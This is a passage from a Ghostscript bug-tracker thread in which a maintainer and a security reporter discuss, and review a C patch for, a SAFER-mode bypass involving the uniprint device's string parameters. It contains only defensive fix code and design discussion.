stdin and stdout access (besides indeed no device switching), but I know realistically you'd run into problems and additional complexity with fonts files, etc.  > I have a proposed solution for this, up for discussion. It's the kind of > change which we'll have to give notice for before implementation, so if we > do go down that route it will be flagged up in a patch release 'sometime > soon' (to be clear, there definitely *will* be a patch release sometime > soon, which may contain this warning) and then rolled into the next main > release. Makes sense. As for the short term and this specific issue, do I understand correctly that you plan to change the interface for these uniprint parameters to argv-only in order to patch this for now? Then SaaS-style SAFER users have a relatively quick fix without compatibility change, and legitimate setpagedevice users are not affected yet (at least outside of uniprint). ```  [Comment 12](show_bug.cgi?id=707662#c12)  Ken Sharp    2024-03-28 16:08:44 UTC  ``` (In reply to Thomas Rinsma from [comment #11](show_bug.cgi?id=707662#c11))  > like in this case writing output to files under /tmp/ and reading it back. I > would almost suggest a "SAFEST" mode with only stdin and stdout access  We once had a PARANOIDSAFER but all that happened was SAFER gradually expanded until there was no difference.   > (besides indeed no device switching), but I know realistically you'd run > into problems and additional complexity with fonts files, etc.  You can't feed a PDF file into Ghostscript via stdin. We do permit that, but all that happens is that we write it to the temp directory anyway and then execute it from there.  If you already have the file on disk, and it's large (many files we get are multi-gigabyte) then that's a performance overhead people wouldn't sit still for.  And some kinds of PDF file can't be sent to stdout, we need to rewrite the file after creation. The same is true of some other file formats too.   > Makes sense. As for the short term and this specific issue, do I understand > correctly that you plan to change the interface for these uniprint > parameters to argv-only in order to patch this for now?  Provided that it works correctly, and doesn't introduce any new problems (such as an inability to configure some aspect of the device), then yes. SAFER mode will mean that the uniprint device can't have certain parameters configured from PostScript. There are other devices with similar restrictions already so I don't anticipate a problem but this is Ghostscript, which bites you when you least expect it. ```  [Comment 13](show_bug.cgi?id=707662#c13)  Ken Sharp    2024-04-05 08:15:16 UTC  ``` It's been a busy few weeks, and it still hasn't settled down yet, so I'm commenting on all the open security bug threads to reassure people that we are working on these. Due to slow responses on one thread it we are unfortunately not yet able to estimate a patch release date.  Because we know that there is at least one person watching/mining our public repositories for security commits we are keeping these in a private repository until a patch release. I'm afraid that means I can't just point to a proposed commit in Gitweb.  The patch to address this issue is:  diff --git a/devices/gdevupd.c b/devices/gdevupd.c index [c9389e7bc](http://www.ghostscript.com/cgi-bin/findgit.cgi?c9389e7bc)..[016a9260a](http://www.ghostscript.com/cgi-bin/findgit.cgi?016a9260a) 100644 --- a/devices/gdevupd.c +++ b/devices/gdevupd.c @@ -1891,6 +1891,16 @@ out on this copies.        if(!upd_strings[i]) continue;        UPD_PARAM_READ(param_read_string,upd_strings[i],value,udev->memory);        if(0 == code) { +        if (gs_is_path_control_active(udev->memory)) { +            if (strings[i].size != value.size) +              error = gs_error_invalidaccess; +            else { +                if (strings[i].data && memcmp(strings[i].data, value.data, strings[i].size) != 0) +                    error = gs_error_invalidaccess; +            } +            if (error < 0) +                goto exit; +        }           if(0 <= error) error |= UPD_PUT_STRINGS;           UPD_MM_DEL_PARAM(udev->memory, strings[i]);           if(!value.size) { @@ -1908,6 +1918,26 @@ out on this copies.        if(!upd_string_a[i]) continue;        UPD_PARAM_READ(param_read_string_array,upd_string_a[i],value,udev->memory);        if(0 == code) { +          if (gs_is_path_control_active(udev->memory)) { +              if (string_a[i].size != value.size) +                  error = gs_error_invalidaccess; +              else { +                  int loop; +                  for (loop = 0;loop < string_a[i].size;loop++) { +                      gs_param_string *tmp1 = (gs_param_string *)&(string_a[i].data[loop]); +                      gs_param_string *tmp2 = (gs_param_string *)&value.data[loop]; + +                      if (tmp1->size != tmp2->size) +                          error = gs_error_invalidaccess; +                      else { +                          if (tmp1->data && memcmp(tmp1->data, tmp2->data, tmp1->size) != 0) +                              error = gs_error_invalidaccess; +                      } +                  } +              } +            if (error < 0) +                goto exit; +          }           if(0 <= error) error |= UPD_PUT_STRING_A;           UPD_MM_DEL_APARAM(udev->memory, string_a[i]);           if(!value.size) { @@ -2102,6 +2132,7 @@ transferred into the device-structure. In the case of "uniprint", this may        if(0 > code) error = code;     }   +exit:     if(0 < error) { /* Actually something loaded without error */          if(!(upd = udev->upd)) {   There will also be another commit to prevent devices being altered after SAFER is active, which will also add a control (--permit_devices=) to create a list of devices which can be selected by PostScript. ```  [Comment 14](show_bug.cgi?id=707662#c14)  Thomas Rinsma    2024-04-05 08:52:05 UTC  ``` (In reply to Ken Sharp from [comment #13](show_bug.cgi?id=707662#c13)) > It's been a busy few weeks, and it still hasn't settled down yet, so I'm > commenting on all the open security bug threads to reassure people that we > are working on these. Due to slow responses on one thread it we are > unfortunately not yet able to estimate a patch release date. All good, thanks for the update!  > The patch to address this issue is: > (...) I can confirm that this indeed prevents the parameters from being set (and hence the bug from being triggered in this way), but I must admit that I don't quite understand how this works. It seems these comparisons make sure that none of the string (array) values can be changed to different values, but then how can they be set in the first place?  > There will also be another commit to prevent devices being altered after > SAFER is active, which will also add a control (--permit_devices=) to create > a list of devices which can be selected by PostScript. Nice, this will greatly reduce the attack surface! ```  [Comment 15](show_bug.cgi?id=707662#c15)  Ken Sharp    2024-04-05 10:43:46 UTC  ``` (In reply to Thomas Rinsma from [comment #14](show_bug.cgi?id=707662#c14))  > I can confirm that this indeed prevents the parameters from being set (and > hence the bug from being triggered in this way), but I must admit that I > don't quite understand how this works. It seems these comparisons make sure > that none of the string (array) values can be changed to different values,  Yep, that's exactly how it works.  > but then how can they be set in the first place?  You have to set them from the command line. We more or less have to trust command line parameters.  If you look in ghostpdl/lib/*.upp these files are all example command lines for setting these (and other!) parameters.  Alternatively, of course, you can just use NOSAFER and accept the fact that PostScript can change them.    > > There will also be another commit to prevent devices being altered after > > SAFER is active, which will also add a control (--permit_devices=) to create > > a list of devices which can be selected by PostScript. > Nice, this will greatly reduce the attack surface!  I realise I wasn't absolutely clear here, because we need to give people warning that one won't be in the patch release, instead the patch release will carry notice that we intend to change the behaviour, and the September release will contain the actual commit. ```  [Comment 16](show_bug.cgi?id=707662#c16)  Thomas Rinsma    2024-04-05 10:57:29 UTC  ``` (In reply to Ken Sharp from [comment #15](show_bug.cgi?id=707662#c15)) > (In reply to Thomas Rinsma from [comment #14](show_bug.cgi?id=707662#c14)) > > but then how can they be set in the first place? >  > You have to set them from the command line. We more or less have to trust > command line parameters. Ah right, because those are of course set before path_control_active is set, makes sense now. I guess what makes it seem a bit convoluted for me is the fact that you do allow "setting" these parameters as long as the value doesn't change (as opposed to just putting the gs_is_path_control_active check higher up). But presumably this is to be extra precise and still allow some code with redundant parameter setting.  Either way, it fixes the bug :)  > I realise I wasn't absolutely clear here, because we need to give people > warning that one won't be in the patch release, instead the patch release > will carry notice that we intend to change the behaviour, and the September > release will contain the actual commit. Got it. ```  [Comment 17](show_bug.cgi?id=707662#c17)  Ken Sharp    2024-04-05 11:11:50 UTC  ``` (In reply to Thomas Rinsma from [comment #16](show_bug.cgi?id=707662#c16))  > Ah right, because those are of course set before path_control_active is set, > makes sense now. I guess what makes it seem a bit convoluted for me is the > fact that you do allow "setting" these parameters as long as the value > doesn't change (as opposed to just putting the gs_is_path_control_active > check higher up). But presumably this is to be extra precise and still allow > some code with redundant parameter setting.  Not exactly. It's because the function can be called many times, even just during startup, and each time it is called it gets all the parameters currently set because they are accumulated into a dictionary in the PostScript environment and the entire dictionary is sent each time setpagedevice is executed.  So if you change the media, then you'll *also* get all the device parameters.  So we have to check to see if the parameter is not just being 'set', but actually being changed. As a side-effect it means that the parameters which aren't sensitive (not format strings) can be changed by PostScript, but frankly I doubt anyone would really want to do that. Still the possibility is there if needed. ```  [Comment 18](show_bug.cgi?id=707662#c18)  Thomas Rinsma    2024-04-05 12:28:10 UTC  ``` Ahh right. Thanks for the clarification. It's a complex beast :) ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=707662)
* - [XML](show_bug.cgi?ctype=xml&id=707662)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=707662)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=707662&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=707662&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


